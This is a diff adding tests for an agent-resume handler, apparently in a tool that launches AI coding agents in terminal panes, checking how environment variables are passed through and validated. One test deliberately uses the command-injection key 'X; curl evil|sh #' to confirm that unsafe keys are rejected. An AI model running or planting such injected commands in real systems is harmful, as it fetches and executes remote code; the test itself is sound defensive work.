@@ -439,6 +439,59 @@ test("agent:resume honors workspace and tab overrides", async () => {
   expect(tabArg).toBe("⟲ !5");
 });
 
+test("agent:resume passes env into the pane command; a resume without env carries none of the start's", async () => {
+  const calls: string[][] = [];
+  const h = fresh({ runner: okRunner(calls) });
+  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { MATTSTACK_PACK: "widgets" } });
+  if (!started.ok) throw new Error("unreachable");
+  calls.length = 0;
+  expect((await h["agent:resume"]({ id: started.data.id, env: { MATTSTACK_PACK: "gadgets" } })).ok).toBe(true);
+  const withEnv = calls.find((c) => c[0] === "pane" && c[1] === "run")?.[3] ?? "";
+  expect(withEnv).toContain("MATTSTACK_PACK='gadgets'");
+  expect(withEnv).toContain(`RT_AGENT_ID='${started.data.id}'`);
+  calls.length = 0;
+  expect((await h["agent:resume"]({ id: started.data.id })).ok).toBe(true);
+  expect(calls.find((c) => c[0] === "pane" && c[1] === "run")?.[3] ?? "").not.toContain("MATTSTACK_PACK");
+});
+
+test("agent:resume refuses an env key that is not a shell identifier and launches nothing", async () => {
+  const calls: string[][] = [];
+  const h = fresh({ runner: okRunner(calls) });
+  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr" });
+  if (!started.ok) throw new Error("unreachable");
+  calls.length = 0;
+  const res = await h["agent:resume"]({ id: started.data.id, env: { "X; curl evil|sh #": "1" } });
+  expect(res.ok).toBe(false);
+  if (res.ok) throw new Error("unreachable");
+  expect(res.error).toBe("invalid env key");
+  expect(calls).toEqual([]);
+});
+
+test("agent:resume refuses env that is not an object of strings", async () => {
+  const h = fresh({ runner: okRunner([]) });
+  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr" });
+  if (!started.ok) throw new Error("unreachable");
+  const res = await h["agent:resume"]({ id: started.data.id, env: { MATTSTACK_PACK: 7 } as never });
+  expect(res.ok).toBe(false);
+  if (res.ok) throw new Error("unreachable");
+  expect(res.error).toBe("env must be an object of strings");
+});
+
+test("agent:resume headless with env is refused and spawns nothing", async () => {
+  let spawnCalled = false;
+  const h = fresh({
+    runner: okRunner([]),
+    spawn: () => { spawnCalled = true; return { exited: Promise.resolve(0), stdout: async () => "{}", sessionId: () => Promise.resolve(undefined) }; },
+  });
+  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr" });
+  if (!started.ok) throw new Error("unreachable");
+  const res = await h["agent:resume"]({ id: started.data.id, surface: "headless", prompt: "go", env: { MATTSTACK_PACK: "widgets" } });
+  expect(res.ok).toBe(false);
+  if (res.ok) throw new Error("unreachable");
+  expect(res.error).toBe("env is only supported for the herdr surface");
+  expect(spawnCalled).toBe(false);
+});
+
 // A launch never emits two --settings flags (controller ruling, fix round
 // 1): the reserved-handle inline crossSessionInbound JSON and the gate-fork
 // hook block must live in the SAME per-agent file behind one flag.
